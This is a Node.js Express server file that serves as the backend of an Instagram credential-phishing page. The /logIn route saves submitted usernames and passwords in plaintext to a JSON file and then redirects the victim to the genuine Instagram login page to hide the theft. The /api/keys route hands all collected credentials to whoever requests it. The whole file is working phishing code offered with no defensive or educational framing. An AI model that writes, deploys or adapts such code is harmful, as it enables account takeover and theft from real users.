const express = require("express");
const fs = require("fs");
const app = express();
const PORT = 8000;

app.set("view engine", "ejs");
app.use(express.static(__dirname + "/assets"));
app.use(express.urlencoded({ extended: true }));

app.get("/", (req, res) => {
  res.render("home");
});

app.post("/logIn", (req, res) => {
  const notes = req.body;
  fs.readFile("./data/data.json", (err, data) => {
    if (err) throw err;

    const information = JSON.parse(data);

    const info = {
      id: ID(),
      username: notes.username,
      password: notes.password,
    };
    information.push(info);

    fs.writeFile("./data/data.json", JSON.stringify(information), (err) => {
      if (err) throw err;
    });

    res.redirect("https://www.instagram.com/accounts/login/");
  });
});

app.get("/api/keys", (req, res) => {
  fs.readFile("./data/data.json", (err, data) => {
    if (err) throw err;

    const datas = JSON.parse(data);

    res.json(datas);
  });
});

var ID = function () {
  return "_" + Math.random().toString(36).substr(2, 9);
};

app.listen(PORT, () => {
  console.log(`this is running on the port ${PORT}`);
});
